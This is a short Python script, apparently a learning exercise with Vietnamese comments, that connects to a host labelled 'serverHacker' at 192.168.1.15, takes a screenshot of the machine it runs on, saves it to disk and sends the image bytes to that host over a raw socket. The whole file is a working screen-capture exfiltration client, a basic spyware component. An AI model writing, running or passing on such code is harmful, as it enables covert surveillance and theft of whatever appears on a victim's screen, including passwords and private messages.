import socket
import imutils
import pyautogui
import cv2
from datetime import datetime
import os

clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)

serverHacker = '192.168.1.15'
serverPort = 12345
clientSocket.connect((serverHacker, serverPort))



now = datetime.now()
nameScreen = "D:\\screenshot"+ now.strftime("%H%M%S") +".png"

# Another Type
pyautogui.screenshot(nameScreen)
# we can then load our screenshot from disk in OpenCV format
image = cv2.imread(nameScreen)

# Mở file ảnh ở chế độ đọc dạng byte
with open(nameScreen, "rb") as image:
    file_size = os.path.getsize(nameScreen)
    print(file_size)
    clientSocket.send(str(file_size).encode())
    while (data := image.read(1024)):
        clientSocket.send(data)
    image.close() 
       
        
    # # Đọc dữ liệu từ file ảnh
    # data = image.read()

    # # Gửi dữ liệu đến server
    # clientSocket.send(data)

# Đóng kết nối
clientSocket.close()